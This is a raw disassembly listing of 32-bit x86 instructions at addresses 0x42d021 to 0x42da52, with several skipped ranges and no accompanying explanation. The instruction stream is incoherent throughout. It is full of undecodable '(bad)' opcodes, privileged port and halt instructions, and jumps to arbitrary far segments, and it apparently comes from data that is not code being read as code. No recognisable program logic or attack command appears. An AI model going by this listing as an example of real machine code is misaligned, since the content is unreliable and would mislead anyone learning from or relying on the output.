  42d021:	or     ch,BYTE PTR [ecx+0x7bb3b993]
  42d027:	rsqrtps xmm0,xmm6
  42d02a:	mov    esp,0x41610f6a
  42d02f:	mov    al,0x5b
  42d031:	loope  0x42d03e
  42d033:	cmp    al,0x7d
  42d035:	daa    
  42d036:	or     edx,DWORD PTR [esi+0x60487a2f]
  42d03c:	push   cs
  42d03d:	(bad)  
  42d03e:	mov    al,ds:0x5b8e93c3
  42d043:	mov    ecx,ss
  42d045:	sbb    DWORD PTR [edi+0x65179fa4],edi
  42d04b:	fsubrp st(3),st
  42d04d:	popa   
  42d04e:	gs test edi,esi
  42d051:	or     al,0xf0
  42d053:	je     0x42cfe4
  42d055:	and    ecx,ebx
  42d057:	lods   al,BYTE PTR ds:[esi]
  42d058:	mov    ebp,0xfb0a79f
  42d05d:	movsx  ebx,BYTE PTR [ecx]
  42d060:	loopne 0x42d09b
  42d062:	scas   al,BYTE PTR es:[edi]
  42d063:	out    0xc,eax
  42d065:	mov    cs,WORD PTR [edx]
  42d067:	dec    eax
  42d068:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42d06a:	retf   0x76d8
  42d06d:	daa    
  42d06e:	jo     0x42d0e9
  42d070:	push   ebp
  42d071:	dec    edx
  42d072:	scas   al,BYTE PTR es:[edi]
  42d073:	xchg   ebx,eax
  42d074:	lods   al,BYTE PTR ds:[esi]
  42d075:	jle    0x42d018
  42d077:	js     0x42d0bd
  42d079:	in     al,dx
  42d07a:	cdq    
  42d07b:	enter  0xf3,0xa0
  42d07f:	and    ebx,DWORD PTR [edx+0x4f47d6dd]
  42d085:	inc    esp
  42d086:	repnz addr16 cdq 
  42d089:	retf   
  42d08a:	and    BYTE PTR [edx+edx*8+0x76],al
  42d08e:	loop   0x42d051
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ebx],dh
  42d101:	fst    DWORD PTR [edx+edx*8+0xc]
  42d105:	loop   0x42d108
  42d107:	add    BYTE PTR [ecx+eax*1],al
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	dec    edi
  42d10d:	sub    BYTE PTR [ecx],0x20
  42d110:	xor    eax,DWORD PTR [esi]
  42d112:	mov    ebp,0x9fdb3afd
  42d117:	cmp    BYTE PTR [ecx+0x49],0x4d
  42d11b:	and    eax,0x12c00502
  42d120:	or     al,BYTE PTR [ebx+ebp*4+0x21d1c427]
  42d127:	add    DWORD PTR [eax+0x33],edx
  42d12a:	retf   
  42d12b:	push   ecx
  42d12c:	adc    BYTE PTR [eax-0x5a],bl
  42d12f:	xor    al,0x53
  42d131:	rcr    BYTE PTR [ebp+eiz*8-0x46],cl
  42d135:	push   es
  42d136:	sub    eax,0xcd11794a
  42d13b:	sub    eax,0xf352c313
  42d140:	out    0x15,al
  42d142:	mov    eax,ds:0x7ed315de
  42d147:	int    0x60
  42d149:	std    
  42d14a:	pusha  
  42d14b:	iret   
  42d14c:	mov    eax,0x75482198
  42d151:	mov    al,0xbc
  42d153:	mov    edx,0x2e629d9a
  42d158:	mov    ecx,0xdc64612e
  42d15d:	dec    ebp
  42d15e:	jne    0x42d105
  42d160:	mov    eax,ds:0x7da934b8
  42d165:	and    BYTE PTR [ebx+0x7c],ch
  42d168:	adc    al,0xff
  42d16a:	or     BYTE PTR [edi],al
  42d16c:	add    BYTE PTR [esi],cl
  42d16e:	cwde   
  42d16f:	icebp  
  42d170:	jae    0x42d0f2
  42d172:	inc    ebp
  42d173:	jns    0x42d12a
  42d175:	cdq    
  42d176:	mov    ebp,0x45b6bc82
  42d17b:	fldcw  WORD PTR [edx-0x28]
  42d17e:	arpl   WORD PTR [ebp-0xd],di
  42d181:	or     DWORD PTR [edx-0x5d],0xad573051
  42d188:	cwde   
  42d189:	aad    0xa
  42d18b:	mov    cl,0xe3
  42d18d:	in     al,0x8c
  42d18f:	pusha  
  42d190:	out    dx,al
  42d191:	pusha  
  42d192:	mov    ecx,DWORD PTR [eax+0x54a93b9f]
  42d198:	cld    
  42d199:	cmc    
  42d19a:	cmp    eax,DWORD PTR [edx]
  42d19c:	jbe    0x42d1ee
  42d19e:	cmp    al,BYTE PTR [esi+edx*8]
  42d1a1:	nop
  42d1a2:	pop    ss
  42d1a3:	fisttp DWORD PTR [esi+0x7f]
  42d1a6:	call   0x6ba7c034
  42d1ab:	cwde   
  42d1ac:	or     ebp,ebp
  42d1ae:	jg     0x42d1b7
  42d1b0:	cs nop
  42d1b2:	imul   edi,DWORD PTR ds:0xae27cdb4,0x60
  42d1b9:	sar    DWORD PTR [ecx+0x23],1
  42d1bc:	xor    BYTE PTR [esi+ebp*8+0x70],bl
  42d1c0:	out    dx,eax
  42d1c1:	pop    ds
  42d1c2:	sbb    ebx,DWORD PTR [esi-0x13b5183]
  42d1c8:	or     DWORD PTR [esi-0x854f23d],0xf748f0d6
  42d1d2:	ins    DWORD PTR es:[edi],dx
  42d1d3:	pop    esp
  42d1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1d5:	cli    
  42d1d6:	sub    al,0xb1
  42d1d8:	add    esp,edi
  42d1da:	pusha  
  42d1db:	aam    0xa6
  42d1dd:	fmul   QWORD PTR [edx-0x5c]
  42d1e0:	scas   eax,DWORD PTR es:[edi]
  42d1e1:	push   ebp
  42d1e2:	(bad)  
  42d1e3:	int3   
  42d1e4:	mov    bl,0xdf
  42d1e6:	cmp    al,0xe2
  42d1e8:	and    edi,eax
  42d1ea:	loop   0x42d190
  42d1ec:	and    BYTE PTR [esi],ah
  42d1ee:	je     0x42d262
  42d1f0:	retf   0x727f
  42d1f3:	push   edx
  42d1f4:	adc    bl,BYTE PTR [edx+0x17030de6]
  42d1fa:	push   ebx
  42d1fb:	ja     0x42d272
  42d1fd:	xchg   esp,eax
  42d1fe:	outs   dx,BYTE PTR ds:[esi]
  42d1ff:	dec    ebx
  42d200:	test   eax,0x262d048b
  42d205:	add    bh,BYTE PTR [eax+0x129b42e]
  42d20b:	dec    ebp
  42d20c:	jno    0x42d222
  42d20e:	aaa    
  42d20f:	jge    0x42d211
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d259
  42d281:	test   BYTE PTR [eax-0x4f],cl
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	mov    eax,ds:0x45693390
  42d291:	add    DWORD PTR [eax-0x62cbb862],esi
  42d297:	sar    BYTE PTR [ebp+0x603450dd],0xbb
  42d29e:	jb     0x42d300
  42d2a0:	pushf  
  42d2a1:	pop    ds
  42d2a2:	out    0xe4,al
  42d2a4:	enter  0xe484,0x60
  42d2a8:	adc    dl,al
  42d2aa:	push   ebx
  42d2ab:	mov    fs,edi
  42d2ad:	arpl   WORD PTR [ebp-0x32],bx
  42d2b0:	imul   edx,DWORD PTR [ebx-0x465b6e78],0x12504a75
  42d2ba:	hlt    
  42d2bb:	outs   dx,BYTE PTR ds:[esi]
  42d2bc:	out    dx,al
  42d2bd:	imul   ch
  42d2bf:	mov    BYTE PTR ds:0xac7ad014,cl
  42d2c5:	(bad)  
  42d2c7:	dec    edx
  42d2c8:	jp     0x42d266
  42d2ca:	add    BYTE PTR [edi],ah
  42d2cc:	add    BYTE PTR [ebp-0xff039d5],dl
  42d2d2:	pop    ds
  42d2d3:	and    DWORD PTR [edx+0x563a619c],edx
  42d2d9:	nop
  42d2da:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2dc:	and    bl,BYTE PTR [esi]
  42d2de:	les    ebp,FWORD PTR [ecx-0x7f6823dc]
  42d2e4:	pop    edi
  42d2e5:	(bad)  
  42d2e6:	fild   WORD PTR [edx+0x1a934334]
  42d2ec:	daa    
  42d2ed:	repnz test ecx,esp
  42d2f0:	jbe    0x42d28f
  42d2f2:	dec    edi
  42d2f3:	rcl    BYTE PTR [esi+ebx*2],1
  42d2f6:	and    al,bl
  42d2f8:	in     al,0xf1
  42d2fa:	xor    DWORD PTR [ebx-0x42],ebp
  42d2fd:	xchg   ebp,eax
  42d2fe:	push   esi
  42d2ff:	or     BYTE PTR [esi+0xf],al
  42d302:	mov    ah,0xde
  42d304:	sbb    al,0xd4
  42d306:	or     al,0x39
  42d308:	call   0xebe2b706
  42d30d:	add    esp,0xdb0fb27c
  42d313:	retf   0x4d3c
  42d316:	fistp  QWORD PTR [edx+0x78]
  42d319:	push   esp
  42d31a:	lahf   
  42d31b:	sub    al,0x53
  42d31d:	dec    ebx
  42d31e:	xor    BYTE PTR [ebx+0x12],al
  42d321:	(bad)
  42d324:	lods   eax,DWORD PTR ds:[esi]
  42d325:	(bad)  
  42d326:	cmp    esi,DWORD PTR ds:0x2adfffa
  42d32c:	and    esi,ebp
  42d32e:	push   esp
  42d32f:	outs   dx,BYTE PTR ds:[esi]
  42d330:	lds    ebx,FWORD PTR [edi-0x10b1ad80]
  42d336:	inc    eax
  42d337:	mov    bh,0x2f
  42d339:	add    esp,DWORD PTR [edi+0x12]
  42d33c:	sbb    al,0xd5
  42d33e:	jp     0x42d35f
  42d340:	and    al,BYTE PTR gs:[edi]
  42d343:	jl     0x42d2f1
  42d345:	(bad)  
  42d346:	mov    edx,0x53cae9f9
  42d34b:	ret    0xdab8
  42d34e:	test   DWORD PTR [esi+0x39],ecx
  42d351:	daa    
  42d352:	test   eax,0xdd274f47
  42d357:	fidiv  WORD PTR ss:[ecx+0x1d]
  42d35b:	or     eax,ebx
  42d35d:	pop    esp
  42d35e:	mov    esi,0x32de83ac
  42d363:	jl     0x42d336
  42d365:	and    BYTE PTR [edx],cl
  42d367:	cmp    bh,dh
  42d369:	lock cmp DWORD PTR [ecx+0x30624367],0x52a02353
  42d374:	mov    ds:0x1848cac9,al
  42d379:	aam    0x7a
  42d37b:	in     eax,0xbb
  42d37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d37e:	lods   eax,DWORD PTR ds:[esi]
  42d37f:	sahf   
  42d380:	push   cs
  42d381:	ffreep st(3)
  42d383:	cli    
  42d384:	retf   0x223
  42d387:	mov    edi,0x919b6acc
  42d38c:	add    BYTE PTR [bx+si+0x66],bh
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	mov    eax,ds:0x147ce187
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	inc    edx
  42d40d:	xor    BYTE PTR [ecx-0x32],bh
  42d410:	adc    al,BYTE PTR [ebp+0x7506487d]
  42d416:	fwait
  42d417:	es (bad) 
  42d419:	push   ebp
  42d41a:	jb     0x42d437
  42d41c:	push   ds
  42d41d:	call   0xbc73:0xd22ca45
  42d424:	jp     0x42d433
  42d426:	push   ebx
  42d427:	cdq    
  42d428:	dec    edx
  42d429:	ds inc esp
  42d42b:	pop    edi
  42d42c:	xor    eax,0xfbc2f3e4
  42d431:	ret    
  42d432:	pop    edi
  42d433:	xchg   edx,eax
  42d434:	add    ah,BYTE PTR [eax+0x48db91e5]
  42d43a:	leave  
  42d43b:	xchg   ah,ch
  42d43d:	jne    0x42d493
  42d43f:	pop    eax
  42d440:	jno    0x42d3e0
  42d442:	or     bh,bl
  42d444:	call   0x5b5b:0xb752490f
  42d44b:	cmp    DWORD PTR [ebx+0x57],0xcb7cc380
  42d452:	cwde   
  42d453:	ins    BYTE PTR es:[edi],dx
  42d454:	adc    al,0xae
  42d456:	jmp    0x31dc:0x37f5b3e5
  42d45d:	mov    edx,0xa0dfcd10
  42d462:	(bad)  
  42d463:	xchg   ebp,eax
  42d464:	mov    ecx,0xf66d5cb1
  42d469:	adc    cl,BYTE PTR [eax]
  42d46b:	cmp    ecx,0xfffffff8
  42d46e:	push   ss
  42d46f:	(bad)  
  42d470:	inc    edi
  42d471:	xor    eax,0x7e48338d
  42d476:	mov    ds,WORD PTR [eax-0x503b5bad]
  42d47c:	xchg   BYTE PTR [edx+0x3d5966c2],cl
  42d482:	add    al,ch
  42d484:	fs jnp 0x42d4cf
  42d487:	sub    BYTE PTR [edi+0x4d],dh
  42d48a:	fcmovb st,st(0)
  42d48c:	cmc    
  42d48d:	mov    esi,DWORD PTR [edx]
  42d48f:	stc    
  42d490:	aaa    
  42d491:	cmp    eax,0xc0ba6f02
  42d496:	adc    eax,0x6568f09a
  42d49b:	xor    eax,0x54f6d98b
  42d4a0:	and    BYTE PTR [ecx],dl
  42d4a2:	sbb    ah,BYTE PTR [eax]
  42d4a4:	cmp    al,0x41
  42d4a6:	add    edx,DWORD PTR [ebx]
  42d4a8:	jg     0x42d521
  42d4aa:	adc    bl,dh
  42d4ac:	and    ebx,0x9b9fd90f
  42d4b2:	pop    eax
  42d4b3:	and    BYTE PTR [ebx+ebx*2+0x2e3053d4],cl
  42d4ba:	clc    
  42d4bb:	lods   eax,DWORD PTR ds:[esi]
  42d4bc:	and    al,0xec
  42d4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4bf:	lock fdiv st,st(7)
  42d4c2:	jle    0x42d532
  42d4c4:	(bad)  
  42d4c5:	pop    eax
  42d4c6:	imul   edi,eax,0x488a469d
  42d4cc:	push   esi
  42d4cd:	inc    edx
  42d4ce:	sahf   
  42d4cf:	dec    esi
  42d4d0:	fisubr DWORD PTR [esi-0x3d]
  42d4d3:	xchg   esi,eax
  42d4d4:	scas   eax,DWORD PTR es:[edi]
  42d4d5:	jmp    0x42d479
  42d4d7:	loope  0x42d4d8
  42d4d9:	sub    bh,BYTE PTR [edi]
  42d4db:	fistp  QWORD PTR [ebp+0x7d]
  42d4de:	mov    ah,0x4e
  42d4e0:	mov    edi,0x686a881c
  42d4e5:	test   dh,dl
  42d4e7:	fidivr DWORD PTR [ebp-0x77]
  42d4ea:	neg    DWORD PTR [ebx+eax*1+0x21]
  42d4ee:	aaa    
  42d4ef:	pushf  
  42d4f0:	jle    0x42d4e2
  42d4f2:	pop    es
  42d4f3:	loop   0x42d4ae
  42d4f5:	sbb    DWORD PTR [edi-0x6a],0x416cdaaf
  42d4fc:	je     0x42d522
  42d4fe:	hlt    
  42d4ff:	mov    WORD PTR [eax+0x24b01779],gs
  42d505:	and    DWORD PTR [ecx-0x53],esp
  42d508:	mov    dh,0x16
  42d50a:	jnp    0x42d56a
  42d50c:	js     0x42d509
  42d50e:	ror    DWORD PTR [ebx],0x0
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x5ca6fad5,eax
  42d583:	mov    esi,0x1e518
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	jg     0x42d526
  42d58e:	lock inc dh
  42d591:	lea    ecx,[eax-0x1f]
  42d594:	lahf   
  42d595:	call   0xebffcaa9
  42d59a:	les    edx,FWORD PTR [esi-0x48]
  42d59d:	into   
  42d59e:	aad    0x44
  42d5a0:	inc    ebx
  42d5a1:	sbb    BYTE PTR [edx],0xf
  42d5a4:	jmp    0x99cdc196
  42d5a9:	adc    esp,DWORD PTR [ecx-0x2c]
  42d5ac:	mov    ch,0x9a
  42d5ae:	inc    BYTE PTR [esi-0x68]
  42d5b1:	inc    esp
  42d5b2:	stos   BYTE PTR es:[edi],al
  42d5b3:	imul   ebx,DWORD PTR [ecx+0x7b],0xffffffda
  42d5b7:	repnz cwde 
  42d5b9:	push   ss
  42d5ba:	fdiv   st(7),st
  42d5bc:	outs   dx,DWORD PTR ds:[esi]
  42d5bd:	cli    
  42d5be:	cwde   
  42d5bf:	mov    ds:0x69b12b84,al
  42d5c4:	push   eax
  42d5c5:	jae    0x42d5b7
  42d5c7:	lods   eax,DWORD PTR ds:[esi]
  42d5c8:	in     eax,dx
  42d5c9:	dec    eax
  42d5ca:	cmc    
  42d5cb:	sbb    cl,BYTE PTR [ebx+0x8]
  42d5ce:	js     0x42d5bf
  42d5d0:	pop    ss
  42d5d1:	icebp  
  42d5d2:	call   0x24ce91c8
  42d5d7:	sbb    bh,BYTE PTR [edi]
  42d5d9:	sub    al,0xb3
  42d5db:	sbb    cl,BYTE PTR [esi+ebp*1]
  42d5de:	jmp    0x42d658
  42d5e0:	adc    BYTE PTR [ebx+0x4e2f4ca1],dh
  42d5e6:	sub    DWORD PTR [esp+eax*4-0x23],ebp
  42d5ea:	mov    bh,0xb0
  42d5ec:	jns    0x42d647
  42d5ee:	mov    edx,0x3cfb9e76
  42d5f3:	dec    ecx
  42d5f4:	or     dh,BYTE PTR [ebx-0x76]
  42d5f7:	mul    DWORD PTR [ecx-0x5c]
  42d5fa:	xor    BYTE PTR [eax+eiz*1],ah
  42d5fd:	mov    dh,0x17
  42d5ff:	ror    DWORD PTR [edx+0x8967287],cl
  42d605:	add    esi,DWORD PTR [esi]
  42d607:	sub    BYTE PTR [ebx-0x7137fa59],0x7e
  42d60e:	sbb    eax,0xe6f007b4
  42d613:	jle    0x42d5bf
  42d615:	lahf   
  42d616:	(bad)
  42d619:	(bad)  
  42d61a:	dec    ebx
  42d61b:	push   ebx
  42d61c:	xchg   ebx,eax
  42d61d:	pop    eax
  42d61e:	inc    ecx
  42d61f:	cmp    eax,0x5604ad97
  42d624:	add    dh,al
  42d626:	mov    ecx,0x5e8a4cdb
  42d62b:	aas    
  42d62c:	jmp    0x6eb3:0x23d67321
  42d633:	stos   BYTE PTR es:[edi],al
  42d634:	sub    bh,BYTE PTR [edx]
  42d636:	mov    BYTE PTR [ebp+0x50e037b4],dh
  42d63c:	imul   ecx,DWORD PTR [ebp-0x57efe46],0xb5407cb3
  42d646:	inc    esi
  42d647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d648:	or     dh,al
  42d64a:	mov    ch,0xcb
  42d64c:	xor    dl,bl
  42d64e:	pop    edi
  42d64f:	jmp    0x42d628
  42d651:	or     ch,BYTE PTR [eax+0x7b]
  42d654:	push   ss
  42d655:	(bad)
  42d658:	je     0x42d604
  42d65a:	scas   al,BYTE PTR es:[edi]
  42d65b:	(bad)  [esi]
  42d65d:	aas    
  42d65e:	dec    edx
  42d65f:	nop
  42d660:	cmp    esi,DWORD PTR [eax-0x46]
  42d663:	fcmovbe st,st(7)
  42d665:	js     0x42d6c6
  42d667:	ja     0x42d64b
  42d669:	in     eax,0x77
  42d66b:	sysret 
  42d66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d66e:	test   BYTE PTR [ebp+0x7ec8b53a],dh
  42d674:	imul   ecx,DWORD PTR [eax-0x55],0x2d
  42d678:	xlat   BYTE PTR ds:[ebx]
  42d679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d67a:	mov    cl,0x64
  42d67c:	sbb    edi,DWORD PTR [ecx+0x2d734715]
  42d682:	aam    0x38
  42d684:	mov    ebx,0xf15ee5ee
  42d689:	(bad)  
  42d68b:	repnz pusha 
  42d68d:	ins    BYTE PTR es:[edi],dx
  42d68e:	sbb    esi,DWORD PTR [edx+0x0]
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x77
  42d701:	sbb    BYTE PTR [edi],ch
  42d703:	inc    esp
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	mov    eax,0x41e3def9
  42d711:	out    0x2,al
  42d713:	mov    eax,ds:0x37ad4332
  42d718:	sbb    BYTE PTR [eax-0x1d8e2bf5],bl
  42d71e:	test   al,0xc8
  42d720:	mov    esi,0x5bf4adf4
  42d725:	dec    eax
  42d726:	std    
  42d727:	add    bl,BYTE PTR [ebp+0x3b]
  42d72a:	sbb    ch,BYTE PTR [ecx]
  42d72c:	sub    ch,dl
  42d72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d72f:	jns    0x42d725
  42d731:	sbb    al,0x11
  42d733:	and    al,0x1
  42d735:	dec    esi
  42d736:	fs icebp 
  42d738:	das    
  42d739:	cmp    eax,0xe79a8976
  42d73e:	aaa    
  42d73f:	cmp    al,0xeb
  42d741:	je     0x42d78f
  42d743:	popa   
  42d744:	out    0xb,al
  42d746:	sub    esi,DWORD PTR [edx+edx*2-0x7631caa7]
  42d74d:	mov    ebp,0xadacfcba
  42d752:	fsub   QWORD PTR [ecx]
  42d754:	imul   esi,DWORD PTR [esi],0xfffffff8
  42d757:	add    cl,cl
  42d759:	ins    BYTE PTR es:[edi],dx
  42d75a:	sub    eax,0x900b1f2d
  42d75f:	pop    ds
  42d760:	mov    edi,0xd0fbcd8e
  42d765:	xchg   ebp,eax
  42d766:	fldenv [ebp-0x562aa334]
  42d76c:	(bad)  
  42d76d:	sbb    eax,0x110466ac
  42d772:	cmc    
  42d773:	call   0xe439:0xca156808
  42d77a:	pop    ds
  42d77b:	dec    edx
  42d77c:	xor    BYTE PTR [edx-0x69e26399],bl
  42d782:	mov    ch,bl
  42d784:	sbb    al,0xa0
  42d786:	push   edi
  42d787:	sbb    edi,ebp
  42d789:	cmp    dl,bh
  42d78b:	xor    eax,0x45d7b082
  42d790:	xor    DWORD PTR [edx],esi
  42d792:	sub    al,0xef
  42d794:	shl    BYTE PTR [esi+0x4b438d1c],1
  42d79a:	test   al,0xf0
  42d79c:	xor    eax,0x3fe3818d
  42d7a1:	sub    al,0xfd
  42d7a3:	sbb    BYTE PTR [ecx-0x1e],dh
  42d7a6:	mov    esi,DWORD PTR [ebx-0x6cb4daa7]
  42d7ac:	out    dx,al
  42d7ad:	sub    al,0x2e
  42d7af:	push   bx
  42d7b1:	jmp    0x42d80d
  42d7b3:	add    DWORD PTR [ecx-0x2513b5cf],esi
  42d7b9:	stc    
  42d7ba:	daa    
  42d7bb:	xchg   ecx,ebp
  42d7bd:	hlt    
  42d7be:	xchg   esi,eax
  42d7c0:	sub    esi,DWORD PTR [esi+ecx*2+0x7deb5810]
  42d7c7:	js     0x42d7a5
  42d7c9:	jo     0x42d80c
  42d7cb:	xchg   BYTE PTR [eax+esi*4-0x3ff71bf7],al
  42d7d2:	pop    edx
  42d7d3:	adc    eax,0x9d435a13
  42d7d8:	xchg   ecx,eax
  42d7d9:	(bad)  
  42d7da:	js     0x42d81e
  42d7dc:	ss push esi
  42d7de:	addr16 push ds
  42d7e0:	dec    ecx
  42d7e1:	or     al,0x9f
  42d7e3:	and    eax,0x479bc410
  42d7e8:	or     eax,DWORD PTR [ecx-0x34867d41]
  42d7ee:	pop    ebp
  42d7ef:	dec    edx
  42d7f0:	push   es
  42d7f1:	xor    DWORD PTR [edx-0x16380e96],esp
  42d7f7:	sub    eax,0x11ef23c1
  42d7fc:	(bad)
  42d800:	jmp    0x42d7dd
  42d802:	(bad)  
  42d803:	(bad)  
  42d804:	jo     0x42d7a0
  42d806:	adc    al,0x11
  42d808:	mov    ah,0x57
  42d80a:	push   eax
  42d80b:	daa    
  42d80c:	enter  0xa49c,0xa9
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x19c6961a
  42d881:	mov    bh,0x17
  42d883:	shl    BYTE PTR [eax],cl
  42d885:	out    0x1,eax
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	xor    WORD PTR [edi-0x3c8022f8],ax
  42d893:	call   eax
  42d895:	fisubr WORD PTR [ecx-0x32d66f50]
  42d89b:	push   ecx
  42d89c:	and    al,0xa1
  42d89e:	clc    
  42d89f:	in     al,0x4f
  42d8a1:	jmp    0xc902:0xb36140f
  42d8a8:	test   al,0xe2
  42d8aa:	imul   edx,DWORD PTR [edi+0x6e381161],0xfffffff3
  42d8b1:	fsub   DWORD PTR [ebp+edx*2-0x45265f1d]
  42d8b8:	and    al,0x86
  42d8ba:	pop    ebx
  42d8bb:	(bad)  
  42d8bc:	data16 cmp al,0xad
  42d8bf:	jnp    0x42d84d
  42d8c1:	and    BYTE PTR [ecx+0x36],ch
  42d8c4:	inc    ecx
  42d8c5:	mov    bl,0x3d
  42d8c7:	stos   BYTE PTR es:[edi],al
  42d8c8:	loope  0x42d8db
  42d8ca:	cmp    BYTE PTR [eax],dl
  42d8cc:	add    edx,esi
  42d8ce:	add    DWORD PTR [edx+ecx*2],edx
  42d8d1:	(bad)  
  42d8d2:	mov    dh,al
  42d8d4:	mov    cl,0xb4
  42d8d6:	cmp    DWORD PTR [eax-0x2eaec8f0],edx
  42d8dc:	jne    0x42d8aa
  42d8de:	xchg   ebx,eax
  42d8df:	call   0xca41dfb7
  42d8e4:	retf   
  42d8e5:	sbb    DWORD PTR [esp+esi*1],esi
  42d8e8:	and    eax,0x817f6f18
  42d8ed:	je     0x42d959
  42d8ef:	bound  edx,QWORD PTR [eax+0x485bd3ef]
  42d8f5:	hlt    
  42d8f6:	fsubr  DWORD PTR [edx]
  42d8f8:	(bad)  
  42d8f9:	push   DWORD PTR [edx+0x3c7fbfa8]
  42d8ff:	neg    DWORD PTR [edi]
  42d901:	stos   DWORD PTR es:[edi],eax
  42d902:	sahf   
  42d903:	cs pop ebp
  42d905:	fnstsw WORD PTR [edi]
  42d907:	mov    ds:0xf2d3a43,eax
  42d90c:	vpsrad xmm4,xmm1,xmm1
  42d910:	xchg   edx,eax
  42d911:	mov    BYTE PTR ds:0xb8468fd9,bh
  42d917:	(bad)  
  42d918:	mov    ds:0x8202b1f0,eax
  42d91d:	out    0x97,eax
  42d91f:	sbb    al,0xaf
  42d921:	std    
  42d922:	in     eax,0xcd
  42d924:	popa   
  42d925:	xor    dh,ah
  42d927:	mov    edx,0xb40f19f2
  42d92c:	sbb    ebx,DWORD PTR [esi]
  42d92e:	lods   eax,DWORD PTR ds:[esi]
  42d92f:	jns    0x42d977
  42d931:	inc    edi
  42d932:	in     al,0x9d
  42d934:	jne    0x42d98c
  42d936:	inc    edi
  42d937:	push   ebx
  42d938:	gs loopne 0x42d916
  42d93b:	inc    esp
  42d93c:	pop    ss
  42d93d:	adc    al,0x73
  42d93f:	cmp    al,0x2b
  42d941:	(bad)  
  42d942:	pop    edi
  42d943:	loopne 0x42d9a3
  42d945:	je     0x42d8cd
  42d947:	pop    ecx
  42d948:	leave  
  42d949:	icebp  
  42d94a:	cmp    eax,0xb97b2b98
  42d94f:	fsub   DWORD PTR [esi]
  42d951:	into   
  42d952:	mov    bh,0x5f
  42d954:	or     al,0xc4
  42d956:	or     al,0xcd
  42d958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d959:	pop    ss
  42d95a:	fistp  QWORD PTR [edx+0xb08233d]
  42d960:	pop    edx
  42d961:	sub    dh,BYTE PTR [eax-0x5e]
  42d964:	(bad)  
  42d965:	jl     0x42d95c
  42d967:	adc    al,0x88
  42d969:	int    0xc
  42d96b:	add    eax,0xd050f9b3
  42d970:	xchg   ecx,eax
  42d971:	mov    al,0xd9
  42d973:	jno    0x42d93c
  42d975:	jle    0x42d97f
  42d977:	sub    al,0x50
  42d979:	mov    ds:0x809e9cfa,eax
  42d97e:	sti    
  42d97f:	icebp  
  42d980:	call   0xc0f6aab1
  42d985:	stc    
  42d986:	lock aas 
  42d988:	sbb    bh,BYTE PTR [edi]
  42d98a:	pop    edi
  42d98b:	rcl    DWORD PTR [ebx],0x15
  42d98e:	mov    ebx,0x74
	...
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	push   0x10
  42da02:	leave  
  42da03:	and    BYTE PTR [eax+ebp*8],0x1
  42da07:	add    BYTE PTR [ecx+eax*1],al
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	hlt    
  42da0d:	inc    esi
  42da0e:	jns    0x42da36
  42da10:	call   0xd6cc:0x7908f082
  42da17:	mov    edx,0x16770bb
  42da1c:	rcl    ebp,0x44
  42da1f:	call   0x4c8e:0x2a3a8744
  42da26:	je     0x42da90
  42da28:	retf   0x593
  42da2b:	and    al,BYTE PTR [ebp+0x34]
  42da2e:	mov    edx,0x7610e815
  42da33:	sbb    ecx,DWORD PTR [eax+0x450f3af3]
  42da39:	jmp    0x42da87
  42da3b:	rol    DWORD PTR [esi-0x46],0xea
  42da3f:	adc    DWORD PTR [ecx],edx
  42da41:	xchg   esi,eax
  42da42:	stc    
  42da43:	loop   0x42d9d1
  42da45:	scas   eax,DWORD PTR es:[edi]
  42da46:	(bad)  [ecx]
  42da48:	and    DWORD PTR [esi-0x18],esi
  42da4b:	arpl   WORD PTR [ebx-0x99f6a92],si
  42da51:	ins    BYTE PTR es:[edi],dx
  42da52:	pusha  
